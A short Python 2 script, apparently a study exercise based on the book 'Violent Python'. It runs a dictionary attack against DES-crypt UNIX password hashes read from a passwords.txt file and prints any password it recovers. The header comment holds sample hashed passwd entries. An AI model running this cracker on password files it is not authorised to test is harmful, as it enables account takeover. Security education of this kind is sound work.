# crypt_cracker.py
#
#	Script that will crack a basic UNIX hashed password with
#	a salt of 'HX'. May modify later.
#
#	Example of UNIX password
#
# 		victim: HX9LLTdc/jiDE: 503:100:Iama Victim:/home/victim:/bin/sh 
#		root: DFNFxgW7C05fo: 504:100: Markus Hess:/root:/bin/bash
#
#	Ref: Violent Python, TJ O'Conner
#
#	LU: 12/16/15

import crypt

def testPass(cryptPass):
	salt = cryptPass[0:2] # The first chars are the salt

	try:
		dictFile = open('dictionary.txt', 'r')
	except IOError:
		print "[-] dictionary.txt file not found. Quitting..."
		return

	for word in dictFile.readlines():
		word = word.strip('\n')
		cryptWord = crypt.crypt(word, salt)

		if(cryptWord == cryptPass):
			print "[+] Found password: " +word+"\n"
			return

	print "[-] Password not found.\n"
	return

def main():

	try:
		passFile = open('passwords.txt')
	except IOError:
		print "[-] passwords.txt file not found. Quitting..."
		return

	for line in passFile.readlines():
		if ":" in line:
			user = line.split(':')[0]
			cryptPass = line.split(':')[1].strip(' ')
			print "[*] Cracking password for: "+user
			testPass(cryptPass)

if __name__ == "__main__":
	main()
